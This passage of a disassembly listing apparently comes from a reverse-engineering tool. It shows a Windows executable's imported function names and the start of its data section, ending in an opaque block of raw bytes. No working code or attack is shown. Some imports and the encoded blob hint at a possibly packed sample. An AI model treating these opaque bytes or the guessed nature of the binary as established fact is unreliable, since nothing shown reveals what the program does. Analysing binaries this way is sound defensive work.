word_42AE94	dw 8			; DATA XREF: .rdata:0042AE34o
		db 'AnyPopup',0
		align 10h
word_42AEA0	dw 168h			; DATA XREF: .rdata:0042AE30o
		db 'GetProcessWindowStation',0
word_42AEBA	dw 121h			; DATA XREF: .rdata:0042AE2Co
		db 'GetDC',0
word_42AEC2	dw 123h			; DATA XREF: .rdata:0042AE28o
		db 'GetDesktopWindow',0
		align 2
word_42AED6	dw 19Bh			; DATA XREF: .rdata:0042AE24o
		db 'GetWindowPlacement',0
		align 4
word_42AEEC	dw 138h			; DATA XREF: .rdata:0042AE20o
		db 'GetInputState',0
word_42AEFC	dw 0C8h			; DATA XREF: .rdata:0042AE1Co
		db 'DrawIconEx',0
		align 2
word_42AF0A	dw 12Eh			; DATA XREF: .rdata:0042AE18o
		db 'GetGUIThreadInfo',0
		align 2
word_42AF1E	dw 2B0h			; DATA XREF: .rdata:0042AE14o
		db 'SetScrollInfo',0
word_42AF2E	dw 59h			; DATA XREF: .rdata:0042AE10o
		db 'CreateCaret',0
word_42AF3C	dw 14Fh			; DATA XREF: .rdata:0042AE0Co
		db 'GetMenuDefaultItem',0
		align 2
word_42AF52	dw 2F5h			; DATA XREF: .rdata:0042AE08o
		db 'TrackMouseEvent',0
word_42AF64	dw 102h			; DATA XREF: .rdata:0042AE04o
		db 'GetAltTabInfoA',0
		align 2
word_42AF76	dw 332h			; DATA XREF: .rdata:0042AE00o
		db 'wsprintfA',0
word_42AF82	dw 233h			; DATA XREF: .rdata:0042ADFCo
		db 'PeekMessageW',0
		align 2
word_42AF92	dw 0AFh			; DATA XREF: .rdata:0042ADF8o
		db 'DispatchMessageW',0
		align 2
word_42AFA6	dw 335h			; DATA XREF: .rdata:0042ADF4o
		db 'wvsprintfW',0
		align 4
word_42AFB4	dw 34h			; DATA XREF: .rdata:0042ADF0o
		db 'CharPrevW',0
word_42AFC0	dw 3Ch			; DATA XREF: .rdata:0042ADECo
		db 'CharUpperW',0
		align 2
word_42AFCE	dw 2Fh			; DATA XREF: .rdata:0042ADE8o
		db 'CharNextA',0
word_42AFDA	dw 212h			; DATA XREF: .rdata:0042ADE4o
		db 'MessageBoxIndirectW',0
word_42AFF0	dw 12Ah			; DATA XREF: .rdata:0042ADE0o
		db 'GetDlgItemTextW',0
word_42B002	dw 290h			; DATA XREF: .rdata:0042ADDCo
		db 'SetDlgItemTextW',0
word_42B014	dw 24Eh			; DATA XREF: .rdata:0042ADD8o
		db 'RegisterClassW',0
		align 2
word_42B026	dw 2ECh			; DATA XREF: .rdata:0042ADD4o
		db 'SystemParametersInfoW',0
word_42B03E	dw 6Eh			; DATA XREF: .rdata:0042ADD0o
		db 'CreateWindowExW',0
word_42B050	dw 3Eh			; DATA XREF: .rdata:0042ADCCo
		db 'CheckDlgButton',0
		align 2
word_42B062	dw 0ACh			; DATA XREF: .rdata:0042ADC8o
		db 'DialogBoxParamW',0
word_42B074	dw 2C6h			; DATA XREF: .rdata:0042ADC4o
		db 'SetWindowPos',0
		align 4
word_42B084	dw 1DCh			; DATA XREF: .rdata:0042ADC0o
		db 'IsWindowEnabled',0
word_42B096	dw 284h			; DATA XREF: .rdata:0042ADBCo
		db 'SetClassLongW',0
word_42B0A6	dw 17Dh			; DATA XREF: .rdata:0042ADB8o
		db 'GetSystemMenu',0
word_42B0B6	dw 0D6h			; DATA XREF: .rdata:0042ADB4o
		db 'EnableMenuItem',0
		align 4
word_42B0C8	dw 0DAh			; DATA XREF: .rdata:0042ADB0o
		db 'EndDialog',0
word_42B0D4	dw 17Eh			; DATA XREF: .rdata:0042ADACo
		db 'GetSystemMetrics',0
		align 4
word_42B0E8	dw 6Bh			; DATA XREF: .rdata:0042ADA8o
		db 'CreatePopupMenu',0
word_42B0FA	dw 0Ah			; DATA XREF: .rdata:0042ADA4o
		db 'AppendMenuW',0
word_42B108	dw 19Ch			; DATA XREF: .rdata:0042ADA0o
		db 'GetWindowRect',0
word_42B118	dw 2F6h			; DATA XREF: .rdata:0042AD9Co
		db 'TrackPopupMenu',0
		align 2
word_42B12A	dw 0D5h			; DATA XREF: .rdata:0042AD98o
		db 'EmptyClipboard',0
		align 4
word_42B13C	dw 286h			; DATA XREF: .rdata:0042AD94o
		db 'SetClipboardData',0
		align 10h
word_42B150	dw 49h			; DATA XREF: .rdata:0042AD90o
		db 'CloseClipboard',0
		align 2
word_42B162	dw 1E7h			; DATA XREF: .rdata:0042AD8Co
		db 'LoadBitmapW',0
word_42B170	dw 1E0h			; DATA XREF: .rdata:0042AD88o
		db 'IsWindowVisible',0
word_42B182	dw 1Eh			; DATA XREF: .rdata:0042AD84o
		db 'CallWindowProcW',0
word_42B194	dw 15Bh			; DATA XREF: .rdata:0042AD80o
		db 'GetMessagePos',0
word_42B1A4	dw 26Dh			; DATA XREF: .rdata:0042AD7Co
		db 'ScreenToClient',0
		align 2
word_42B1B6	dw 1CEh			; DATA XREF: .rdata:0042AD78o
		db 'IsDlgButtonChecked',0
		align 4
word_42B1CC	dw 107h			; DATA XREF: .rdata:off_42AD74o
		db 'GetAsyncKeyState',0
		align 10h
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .rdata:0042AA20o
		align 4
word_42B1EC	dw 2B0h			; DATA XREF: .rdata:0042AAD4o
		db 'StartDocW',0
word_42B1F8	dw 218h			; DATA XREF: .rdata:0042AAD0o
		db 'GetTextColor',0
		align 4
word_42B208	dw 129h			; DATA XREF: .rdata:0042AACCo
		db 'EnumICMProfilesA',0
		align 4
word_42B21C	dw 13h			; DATA XREF: .rdata:0042AAC8o
		db 'BitBlt',0
		align 2
word_42B226	dw 1A8h			; DATA XREF: .rdata:0042AAC4o
		db 'GetBitmapDimensionEx',0
		align 2
word_42B23E	dw 1D2h			; DATA XREF: .rdata:0042AAC0o
		db 'GetEnhMetaFileDescriptionA',0
		align 4
word_42B25C	dw 277h			; DATA XREF: .rdata:0042AABCo
		db 'SelectObject',0
		align 4
word_42B26C	dw 257h			; DATA XREF: .rdata:0042AAB8o
		db 'Polyline',0
		align 4
word_42B278	dw 26h			; DATA XREF: .rdata:0042AAB4o
		db 'CopyEnhMetaFileW',0
		align 4
word_42B28C	dw 14Eh			; DATA XREF: .rdata:0042AAB0o
		db 'GdiComment',0
		align 2
word_42B29A	dw 226h			; DATA XREF: .rdata:0042AAACo
		db 'GetTextMetricsW',0
word_42B2AC	dw 1B2h			; DATA XREF: .rdata:0042AAA8o
		db 'GetCharABCWidthsFloatA',0
		align 2
word_42B2C6	dw 0EDh			; DATA XREF: .rdata:0042AAA4o
		db 'Ellipse',0
word_42B2D0	dw 1D6h			; DATA XREF: .rdata:0042AAA0o
		db 'GetEnhMetaFilePixelFormat',0
word_42B2EC	dw 286h			; DATA XREF: .rdata:0042AA9Co
		db 'SetDCPenColor',0
word_42B2FC	dw 284h			; DATA XREF: .rdata:0042AA98o
		db 'SetColorSpace',0
word_42B30C	dw 1A4h			; DATA XREF: .rdata:0042AA94o
		db 'GetArcDirection',0
word_42B31E	dw 2B5h			; DATA XREF: .rdata:0042AA90o
		db 'StrokeAndFillPath',0
word_42B332	dw 12Eh			; DATA XREF: .rdata:0042AA8Co
		db 'Escape',0
		align 4
word_42B33C	dw 216h			; DATA XREF: .rdata:0042AA88o
		db 'GetTextCharset',0
		align 2
word_42B34E	dw 4Bh			; DATA XREF: .rdata:0042AA84o
		db 'CreatePen',0
word_42B35A	dw 1B5h			; DATA XREF: .rdata:0042AA80o
		db 'GetCharABCWidthsW',0
word_42B36E	dw 1C6h			; DATA XREF: .rdata:0042AA7Co
		db 'GetDCBrushColor',0
word_42B380	dw 2ADh			; DATA XREF: .rdata:0042AA78o
		db 'SetWindowOrgEx',0
		align 2
word_42B392	dw 249h			; DATA XREF: .rdata:0042AA74o
		db 'PlayEnhMetaFile',0
word_42B3A4	dw 270h			; DATA XREF: .rdata:0042AA70o
		db 'SaveDC',0
		align 2
word_42B3AE	dw 28Fh			; DATA XREF: .rdata:0042AA6Co
		db 'SetICMProfileA',0
		align 10h
word_42B3C0	dw 1FBh			; DATA XREF: .rdata:0042AA68o
		db 'GetObjectA',0
		align 2
word_42B3CE	dw 142h			; DATA XREF: .rdata:off_42AA64o
		db 'FillRgn',0
word_42B3D8	dw 1EEh			; DATA XREF: .rdata:0042AAD8o
		db 'GetLogColorSpaceA',0
aGdi32_dll	db 'GDI32.dll',0        ; DATA XREF: .rdata:0042AA34o
word_42B3F6	dw 27Fh			; DATA XREF: .rdata:0042AB84o
		db 'GetTapeParameters',0
word_42B40A	dw 165h			; DATA XREF: .rdata:0042AB88o
		db 'FreeResource',0
		align 2
word_42B41A	dw 4F4h			; DATA XREF: .rdata:0042AB8Co
		db 'WTSGetActiveConsoleSessionId',0
		align 2
word_42B43A	dw 2C4h			; DATA XREF: .rdata:0042AB90o
		db 'GlobalUnfix',0
word_42B448	dw 227h			; DATA XREF: .rdata:0042AB94o
		db 'GetNumaAvailableMemoryNode',0
		align 2
word_42B466	dw 34Ch			; DATA XREF: .rdata:0042AB98o
		db 'LocalShrink',0
word_42B474	dw 185h			; DATA XREF: .rdata:0042AB9Co
		db 'GetCommTimeouts',0
word_42B486	dw 30Eh			; DATA XREF: .rdata:0042ABA0o
		db 'IsWow64Process',0
		align 4
word_42B498	dw 1E0h			; DATA XREF: .rdata:0042ABA4o
		db 'GetExitCodeThread',0
word_42B4AC	dw 23Ah			; DATA XREF: .rdata:0042ABA8o
		db 'GetPriorityClass',0
		align 10h
word_42B4C0	dw 40Eh			; DATA XREF: .rdata:0042ABACo
		db 'RequestWakeupLatency',0
		align 4
word_42B4D8	dw 54Ah			; DATA XREF: .rdata:0042ABB0o
		db 'lstrcpynA',0
word_42B4E4	dw 0D6h			; DATA XREF: .rdata:0042ABB4o
		db 'DeleteFileW',0
word_42B4F2	dw 139h			; DATA XREF: .rdata:0042ABB8o
		db 'FindFirstFileW',0
		align 4
word_42B504	dw 145h			; DATA XREF: .rdata:0042ABBCo
		db 'FindNextFileW',0
word_42B514	dw 12Eh			; DATA XREF: .rdata:0042ABC0o
		db 'FindClose',0
word_42B520	dw 466h			; DATA XREF: .rdata:0042ABC4o
		db 'SetFilePointer',0
		align 2
word_42B532	dw 367h			; DATA XREF: .rdata:0042ABC8o
		db 'MultiByteToWideChar',0
word_42B548	dw 3C0h			; DATA XREF: .rdata:0042ABCCo
		db 'ReadFile',0
		align 4
word_42B554	dw 525h			; DATA XREF: .rdata:0042ABD0o
		db 'WriteFile',0
word_42B560	dw 366h			; DATA XREF: .rdata:0042ABD4o
		db 'MulDiv',0
		align 2
word_42B56A	dw 54Dh			; DATA XREF: .rdata:0042ABD8o
		db 'lstrlenA',0
		align 2
word_42B576	dw 511h			; DATA XREF: .rdata:0042ABDCo
		db 'WideCharToMultiByte',0
word_42B58C	dw 242h			; DATA XREF: .rdata:0042ABE0o
		db 'GetPrivateProfileStringW',0
		align 4
word_42B5A8	dw 52Bh			; DATA XREF: .rdata:0042ABE4o
		db 'WritePrivateProfileStringW',0
		align 2
word_42B5C6	dw 162h			; DATA XREF: .rdata:0042ABE8o
		db 'FreeLibrary',0
word_42B5D4	dw 33Eh			; DATA XREF: .rdata:0042ABECo
		db 'LoadLibraryExW',0
		align 2
word_42B5E6	dw 218h			; DATA XREF: .rdata:0042ABF0o
		db 'GetModuleHandleW',0
		align 2
word_42B5FA	dw 2BAh			; DATA XREF: .rdata:0042ABF4o
		db 'GlobalFree',0
		align 4
word_42B608	dw 1DFh			; DATA XREF: .rdata:0042ABF8o
		db 'GetExitCodeProcess',0
		align 2
word_42B61E	dw 4F9h			; DATA XREF: .rdata:0042ABFCo
		db 'WaitForSingleObject',0
word_42B634	dw 2B3h			; DATA XREF: .rdata:0042AC00o
		db 'GlobalAlloc',0
word_42B642	dw 11Dh			; DATA XREF: .rdata:0042AC04o
		db 'ExpandEnvironmentStringsW',0
word_42B65E	dw 542h			; DATA XREF: .rdata:0042AC08o
		db 'lstrcmpW',0
		align 2
word_42B66A	dw 545h			; DATA XREF: .rdata:0042AC0Co
		db 'lstrcmpiW',0
word_42B676	dw 541h			; DATA XREF: .rdata:0042AC10o
		db 'lstrcmpA',0
		align 2
word_42B682	dw 403h			; DATA XREF: .rdata:0042AC14o
		db 'RemoveDirectoryW',0
		align 2
word_42B696	dw 547h			; DATA XREF: .rdata:0042AC18o
		db 'lstrcpyA',0
		align 2
word_42B6A2	dw 2A2h			; DATA XREF: .rdata:0042AC1Co
		db 'GetVersion',0
		align 10h
word_42B6B0	dw 270h			; DATA XREF: .rdata:0042AC20o
		db 'GetSystemDirectoryW',0
word_42B6C6	dw 2A4h			; DATA XREF: .rdata:0042AC24o
		db 'GetVersionExW',0
word_42B6D6	dw 548h			; DATA XREF: .rdata:0042AC28o
		db 'lstrcpyW',0
		align 2
word_42B6E2	dw 380h			; DATA XREF: .rdata:0042AC2Co
		db 'OpenProcess',0
word_42B6F0	dw 215h			; DATA XREF: .rdata:0042AC30o
		db 'GetModuleHandleA',0
		align 4
word_42B704	dw 33Ch			; DATA XREF: .rdata:0042AC34o
		db 'LoadLibraryA',0
		align 4
word_42B714	dw 245h			; DATA XREF: .rdata:0042AC38o
		db 'GetProcAddress',0
		align 2
word_42B726	dw 53Fh			; DATA XREF: .rdata:0042AB80o
		db 'lstrcatW',0
		align 2
word_42B732	dw 283h			; DATA XREF: .rdata:0042AC3Co
		db 'GetTempFileNameW',0
		align 2
word_42B746	dw 544h			; DATA XREF: .rdata:0042AC40o
		db 'lstrcmpiA',0
word_42B752	dw 0A8h			; DATA XREF: .rdata:0042AC44o
		db 'CreateProcessW',0
		align 4
word_42B764	dw 33Fh			; DATA XREF: .rdata:0042AC48o
		db 'LoadLibraryW',0
		align 4
word_42B774	dw 0B5h			; DATA XREF: .rdata:0042AC4Co
		db 'CreateThread',0
		align 4
word_42B784	dw 2BEh			; DATA XREF: .rdata:0042AC50o
		db 'GlobalLock',0
		align 2
word_42B792	dw 2C5h			; DATA XREF: .rdata:0042AC54o
		db 'GlobalUnlock',0
		align 2
word_42B7A2	dw 1CFh			; DATA XREF: .rdata:0042AC58o
		db 'GetDiskFreeSpaceW',0
word_42B7B6	dw 54Bh			; DATA XREF: .rdata:0042AC5Co
		db 'lstrcpynW',0
word_42B7C2	dw 54Eh			; DATA XREF: .rdata:0042AC60o
		db 'lstrlenW',0
		align 2
word_42B7CE	dw 52h			; DATA XREF: .rdata:0042AC64o
		db 'CloseHandle',0
word_42B7DC	dw 458h			; DATA XREF: .rdata:0042AC68o
		db 'SetErrorMode',0
		align 4
word_42B7EC	dw 187h			; DATA XREF: .rdata:0042AC6Co
		db 'GetCommandLineW',0
word_42B7FE	dw 285h			; DATA XREF: .rdata:0042AC70o
		db 'GetTempPathW',0
		align 2
word_42B80E	dw 2AFh			; DATA XREF: .rdata:0042AC74o
		db 'GetWindowsDirectoryW',0
		align 2
word_42B826	dw 119h			; DATA XREF: .rdata:0042AC78o
		db 'ExitProcess',0
word_42B834	dw 75h			; DATA XREF: .rdata:0042AC7Co
		db 'CopyFileW',0
word_42B840	dw 1C0h			; DATA XREF: .rdata:0042AC80o
		db 'GetCurrentProcess',0
word_42B854	dw 214h			; DATA XREF: .rdata:0042AC84o
		db 'GetModuleFileNameW',0
		align 2
word_42B86A	dw 3B1h			; DATA XREF: .rdata:0042AC88o
		db 'RaiseException',0
		align 4
word_42B87C	dw 24Ah			; DATA XREF: .rdata:0042AC8Co
		db 'GetProcessHeap',0
		align 2
word_42B88E	dw 44Dh			; DATA XREF: .rdata:0042AC90o
		db 'SetCurrentDirectoryW',0
		align 2
word_42B8A6	dw 1BFh			; DATA XREF: .rdata:0042AC94o
		db 'GetCurrentDirectoryW',0
		align 2
word_42B8BE	dw 1EAh			; DATA XREF: .rdata:0042AC98o
		db 'GetFileAttributesW',0
		align 4
word_42B8D4	dw 4BEh			; DATA XREF: .rdata:0042AC9Co
		db 'SystemTimeToTzSpecificLocalTime',0
word_42B8F6	dw 298h			; DATA XREF: .rdata:0042ACA0o
		db 'GetTimeZoneInformation',0
		align 10h
word_42B910	dw 277h			; DATA XREF: .rdata:0042ACA4o
		db 'GetSystemTime',0
word_42B920	dw 15Eh			; DATA XREF: .rdata:0042ACA8o
		db 'FormatMessageW',0
		align 2
word_42B932	dw 18Fh			; DATA XREF: .rdata:0042ACACo
		db 'GetComputerNameW',0
		align 2
word_42B946	dw 203h			; DATA XREF: .rdata:0042ACB0o
		db 'GetLocalTime',0
		align 2
word_42B956	dw 88h			; DATA XREF: .rdata:0042ACB4o
		db 'CreateFileA',0
word_42B964	dw 157h			; DATA XREF: .rdata:0042ACB8o
		db 'FlushFileBuffers',0
		align 4
word_42B978	dw 524h			; DATA XREF: .rdata:0042ACBCo
		db 'WriteConsoleW',0
word_42B988	dw 487h			; DATA XREF: .rdata:0042ACC0o
		db 'SetStdHandle',0
		align 4
word_42B998	dw 304h			; DATA XREF: .rdata:0042ACC4o
		db 'IsProcessorFeaturePresent',0
word_42B9B4	dw 2D2h			; DATA XREF: .rdata:0042ACC8o
		db 'HeapReAlloc',0
word_42B9C2	dw 2D4h			; DATA XREF: .rdata:0042ACCCo
		db 'HeapSize',0
		align 2
word_42B9CE	dw 269h			; DATA XREF: .rdata:0042ACD0o
		db 'GetStringTypeW',0
		align 10h
word_42B9E0	dw 1ACh			; DATA XREF: .rdata:0042ACD4o
		db 'GetConsoleMode',0
		align 2
word_42B9F2	dw 19Ah			; DATA XREF: .rdata:0042ACD8o
		db 'GetConsoleCP',0
		align 2
word_42BA02	dw 418h			; DATA XREF: .rdata:0042ACDCo
		db 'RtlUnwind',0
word_42BA0E	dw 32Dh			; DATA XREF: .rdata:0042ACE0o
		db 'LCMapStringW',0
		align 2
word_42BA1E	dw 2CBh			; DATA XREF: .rdata:0042ACE4o
		db 'HeapAlloc',0
word_42BA2A	dw 30Ah			; DATA XREF: .rdata:0042ACE8o
		db 'IsValidCodePage',0
word_42BA3C	dw 237h			; DATA XREF: .rdata:0042ACECo
		db 'GetOEMCP',0
		align 4
word_42BA48	dw 168h			; DATA XREF: .rdata:0042ACF0o
		db 'GetACP',0
		align 2
word_42BA52	dw 172h			; DATA XREF: .rdata:0042ACF4o
		db 'GetCPInfo',0
word_42BA5E	dw 2CFh			; DATA XREF: .rdata:0042ACF8o
		db 'HeapFree',0
		align 2
word_42BA6A	dw 300h			; DATA XREF: .rdata:0042ACFCo
		db 'IsDebuggerPresent',0
word_42BA7E	dw 4D3h			; DATA XREF: .rdata:0042AD00o
		db 'UnhandledExceptionFilter',0
		align 2
word_42BA9A	dw 4C0h			; DATA XREF: .rdata:0042AD04o
		db 'TerminateProcess',0
		align 2
word_42BAAE	dw 279h			; DATA XREF: .rdata:0042AD08o
		db 'GetSystemTimeAsFileTime',0
word_42BAC8	dw 1C1h			; DATA XREF: .rdata:0042AD0Co
		db 'GetCurrentProcessId',0
word_42BADE	dw 3A7h			; DATA XREF: .rdata:0042AD10o
		db 'QueryPerformanceCounter',0
word_42BAF8	dw 2CDh			; DATA XREF: .rdata:0042AD14o
		db 'HeapCreate',0
		align 2
word_42BB06	dw 1C5h			; DATA XREF: .rdata:0042AD18o
		db 'GetCurrentThreadId',0
		align 4
word_42BB1C	dw 473h			; DATA XREF: .rdata:0042AD1Co
		db 'SetLastError',0
		align 4
word_42BB2C	dw 4C6h			; DATA XREF: .rdata:0042AD20o
		db 'TlsFree',0
word_42BB36	dw 4C8h			; DATA XREF: .rdata:0042AD24o
		db 'TlsSetValue',0
word_42BB44	dw 4C7h			; DATA XREF: .rdata:0042AD28o
		db 'TlsGetValue',0
word_42BB52	dw 4C5h			; DATA XREF: .rdata:0042AD2Co
		db 'TlsAlloc',0
		align 2
word_42BB5E	dw 1F3h			; DATA XREF: .rdata:0042AD30o
		db 'GetFileType',0
word_42BB6C	dw 2E3h			; DATA XREF: .rdata:0042AD34o
		db 'InitializeCriticalSectionAndSpinCount',0
word_42BB94	dw 46Fh			; DATA XREF: .rdata:0042AD38o
		db 'SetHandleCount',0
		align 2
word_42BBA6	dw 1DAh			; DATA XREF: .rdata:0042AD3Co
		db 'GetEnvironmentStringsW',0
		align 10h
word_42BBC0	dw 161h			; DATA XREF: .rdata:0042AD40o
		db 'FreeEnvironmentStringsW',0
word_42BBDA	dw 213h			; DATA XREF: .rdata:0042AD44o
		db 'GetModuleFileNameA',0
		align 10h
word_42BBF0	dw 264h			; DATA XREF: .rdata:0042AD48o
		db 'GetStdHandle',0
		align 10h
word_42BC00	dw 4A5h			; DATA XREF: .rdata:0042AD4Co
		db 'SetUnhandledExceptionFilter',0
word_42BC1E	dw 263h			; DATA XREF: .rdata:0042AD50o
		db 'GetStartupInfoW',0
word_42BC30	dw 2D3h			; DATA XREF: .rdata:0042AD54o
		db 'HeapSetInformation',0
		align 2
word_42BC46	dw 186h			; DATA XREF: .rdata:0042AD58o
		db 'GetCommandLineA',0
word_42BC58	dw 467h			; DATA XREF: .rdata:0042AD5Co
		db 'SetFilePointerEx',0
		align 4
word_42BC6C	dw 0E8h			; DATA XREF: .rdata:0042AD60o
		db 'DuplicateHandle',0
word_42BC7E	dw 453h			; DATA XREF: .rdata:0042AD64o
		db 'SetEndOfFile',0
		align 2
word_42BC8E	dw 0E4h			; DATA XREF: .rdata:0042AD68o
		db 'DosDateTimeToFileTime',0
word_42BCA6	dw 346h			; DATA XREF: .rdata:0042AD6Co
		db 'LocalFileTimeToFileTime',0
word_42BCC0	dw 46Ah			; DATA XREF: .rdata:0042AB38o
		db 'SetFileTime',0
word_42BCCE	dw 123h			; DATA XREF: .rdata:0042AB34o
		db 'FileTimeToDosDateTime',0
word_42BCE6	dw 124h			; DATA XREF: .rdata:0042AB30o
		db 'FileTimeToLocalFileTime',0
word_42BD00	dw 125h			; DATA XREF: .rdata:0042AB2Co
		db 'FileTimeToSystemTime',0
		align 4
word_42BD18	dw 273h			; DATA XREF: .rdata:0042AB28o
		db 'GetSystemInfo',0
word_42BD28	dw 40Fh			; DATA XREF: .rdata:0042AB24o
		db 'ResetEvent',0
		align 2
word_42BD36	dw 4F7h			; DATA XREF: .rdata:0042AB20o
		db 'WaitForMultipleObjects',0
		align 10h
word_42BD50	dw 1DCh			; DATA XREF: .rdata:0042AB1Co
		db 'GetEnvironmentVariableW',0
word_42BD6A	dw 293h			; DATA XREF: .rdata:0042AB18o
		db 'GetTickCount',0
		align 2
word_42BD7A	dw 11Ah			; DATA XREF: .rdata:0042AB14o
		db 'ExitThread',0
		align 4
word_42BD88	dw 457h			; DATA XREF: .rdata:0042AB10o
		db 'SetEnvironmentVariableW',0
word_42BDA2	dw 202h			; DATA XREF: .rdata:0042AB7Co
		db 'GetLastError',0
		align 2
word_42BDB2	dw 360h			; DATA XREF: .rdata:0042AB08o
		db 'MoveFileExW',0
word_42BDC0	dw 81h			; DATA XREF: .rdata:0042AB04o
		db 'CreateDirectoryW',0
		align 4
word_42BDD4	dw 0DDh			; DATA XREF: .rdata:0042AB00o
		db 'DeviceIoControl',0
word_42BDE6	dw 8Fh			; DATA XREF: .rdata:0042AAFCo
		db 'CreateFileW',0
word_42BDF4	dw 1D3h			; DATA XREF: .rdata:0042AAF8o
		db 'GetDriveTypeW',0
word_42BE04	dw 1CEh			; DATA XREF: .rdata:0042AAF4o
		db 'GetDiskFreeSpaceExW',0
word_42BE1A	dw 208h			; DATA XREF: .rdata:0042AAF0o
		db 'GetLogicalDriveStringsW',0
word_42BE34	dw 3A0h			; DATA XREF: .rdata:0042AAECo
		db 'QueryDosDeviceW',0
word_42BE46	dw 348h			; DATA XREF: .rdata:0042AAE8o
		db 'LocalFree',0
word_42BE52	dw 64h			; DATA XREF: .rdata:0042AAE4o
		db 'CompareStringW',0
		align 4
word_42BE64	dw 459h			; DATA XREF: .rdata:off_42AAE0o
		db 'SetEvent',0
		align 10h
word_42BE70	dw 339h			; DATA XREF: .rdata:0042AB0Co
		db 'LeaveCriticalSection',0
		align 4
word_42BE88	dw 0EEh			; DATA XREF: .rdata:0042AB3Co
		db 'EnterCriticalSection',0
		align 10h
word_42BEA0	dw 0D1h			; DATA XREF: .rdata:0042AB40o
		db 'DeleteCriticalSection',0
word_42BEB8	dw 82h			; DATA XREF: .rdata:0042AB44o
		db 'CreateEventA',0
		align 4
word_42BEC8	dw 2E2h			; DATA XREF: .rdata:0042AB48o
		db 'InitializeCriticalSection',0
word_42BEE4	dw 461h			; DATA XREF: .rdata:0042AB4Co
		db 'SetFileAttributesW',0
		align 2
word_42BEFA	dw 4B2h			; DATA XREF: .rdata:0042AB50o
		db 'Sleep',0
word_42BF02	dw 262h			; DATA XREF: .rdata:0042AB54o
		db 'GetStartupInfoA',0
word_42BF14	dw 4ECh			; DATA XREF: .rdata:0042AB58o
		db 'VirtualFree',0
word_42BF22	dw 4E9h			; DATA XREF: .rdata:0042AB5Co
		db 'VirtualAlloc',0
		align 2
word_42BF32	dw 160h			; DATA XREF: .rdata:0042AB60o
		db 'FreeEnvironmentStringsA',0
word_42BF4C	dw 1D8h			; DATA XREF: .rdata:0042AB64o
		db 'GetEnvironmentStrings',0
word_42BF64	dw 2EFh			; DATA XREF: .rdata:0042AB68o
		db 'InterlockedIncrement',0
		align 4
word_42BF7C	dw 2EBh			; DATA XREF: .rdata:0042AB6Co
		db 'InterlockedDecrement',0
		align 4
word_42BF94	dw 32Bh			; DATA XREF: .rdata:0042AB70o
		db 'LCMapStringA',0
		align 4
word_42BFA4	dw 266h			; DATA XREF: .rdata:0042AB74o
		db 'GetStringTypeA',0
		align 2
word_42BFB6	dw 204h			; DATA XREF: .rdata:0042AB78o
		db 'GetLocaleInfoA',0
		align 4
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:0042AA48o
		align 40h
_rdata		ends

; Section 4. (virtual address 0002C000)
; Virtual size			: 000230E0 ( 143584.)
; Section size in file		: 00005200 (  20992.)
; Offset to raw	data for section: 0002A000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 42C000h
dword_42C000	dd 13h			; DATA XREF: sub_4071A0+F7r
					; .text:0040802Dr ...
dword_42C004	dd 4Bh			; DATA XREF: sub_407380+146r
					; sub_408140+89r ...
dword_42C008	dd 50h			; DATA XREF: sub_407820+1Er
					; sub_409DF0+884r ...
dword_42C00C	dd 10h			; DATA XREF: .text:00409190r
					; sub_409B10+73r ...
dword_42C010	dd 35h			; DATA XREF: sub_408140+5Ar
					; sub_408140+28Dr ...
		dd 1Ah
; HANDLE hProcess
hProcess	dd 28h			; DATA XREF: sub_402C40+61r
					; sub_402C40+92w ...
; PBOOL	Wow64Process
Wow64Process	dd 5Eh			; DATA XREF: sub_402C40+260w
					; .text:00408E92w ...
; HDC lpExitCode
lpExitCode	dd 4Bh			; DATA XREF: sub_402C40+5Cr
					; sub_402C40+2A9r ...
dword_42C024	dd 12h			; DATA XREF: sub_402C40+81w
					; sub_402C40+98r ...
; int y
y		dd 5Eh			; DATA XREF: sub_402C40+238w
					; sub_402C40+248r ...
; COLORREF hdc
hdc		dd 64h			; DATA XREF: sub_402C40+BCw
					; sub_402C40+296w ...
		dd 26h
dword_42C034	dd 39h			; DATA XREF: sub_402520+62w
					; sub_402C40+2E4r ...
dword_42C038	dd 55h			; DATA XREF: .text:00407184r
					; .text:0040718Bw ...
dword_42C03C	dd 16h			; DATA XREF: sub_407A90+4F0w
					; .text:0040810Cr ...
dword_42C040	dd 19h			; DATA XREF: sub_402000+61w
					; .text:00402BBDr ...
dword_42C044	dd 3Eh			; DATA XREF: sub_402C40:loc_402D83r
					; sub_402C40+14Cw ...
dword_42C048	dd 3Ch			; DATA XREF: sub_409B10+174r
					; sub_409B10+17Aw ...
dword_42C04C	dd 21h			; DATA XREF: sub_402520+1B0w
					; sub_407A90+2D1w ...
dword_42C050	dd 3Ah			; DATA XREF: .text:004077E5r
					; .text:004077EDw ...
dword_42C054	dd 10h			; DATA XREF: sub_402C40+1B7r
					; sub_402C40+1BDw ...
dword_42C058	dd 4Eh			; DATA XREF: sub_408650+1E9r
					; sub_408650+1F1w ...
		dd 14h,	4Bh
dword_42C064	dd 0FA1h		; DATA XREF: sub_409DF0+122Er
					; sub_409DF0+4788r
byte_42C068	db 95h			; DATA XREF: sub_409DF0+1291r
		align 4
		db 0CBh
word_42C06D	dw 0			; DATA XREF: WinMain(x,x,x,x)+5732r
		align 10h
		dd 2Ch,	90h, 0F8h, 44h,	3 dup(40h), 0C1h, 4, 44h, 30h
		dd 2 dup(3Fh), 90h, 88h, 0B5h, 36h, 0CBh, 85h, 3Ch, 0C1h
		dd 2 dup(4), 31h, 2 dup(3Fh), 93h, 96h,	97h, 68h, 0A0h
		dd 3 dup(80h), 6Bh, 9Eh, 41h, 62h, 0D6h, 3, 76h, 0A7h
		dd 0Dh,	96h, 0F4h, 76h,	0A9h, 41h, 6Bh,	90h, 0BEh, 47h
		dd 0C3h, 88h, 0B3h, 3 dup(80h),	41h, 69h, 0D0h,	1, 29h
		dd 0B2h, 0CDh, 49h, 98h, 2Bh, 53h, 7Eh,	7, 83h,	44h, 78h
		dd 3 dup(40h), 0CDh, 43h, 0C5h,	1Bh, 0B5h, 11h,	0B4h, 0Fh
		dd 1, 21h, 94h,	0C9h, 85h, 3Ch,	2Bh, 59h, 75h, 0FEh, 3Eh
		dd 0C7h, 43h, 20h, 31h,	3 dup(0)
		dd 31h,	0D6h, 39h, 0F2h, 74h, 9, 8Dh, 0
		dd 74h,	0ECh, 0BBh, 11h, 3 dup(0)
		dd 0C6h, 85h, 0D1h, 0B1h, 2 dup(0FFh), 2 dup(2Bh), 4Fh
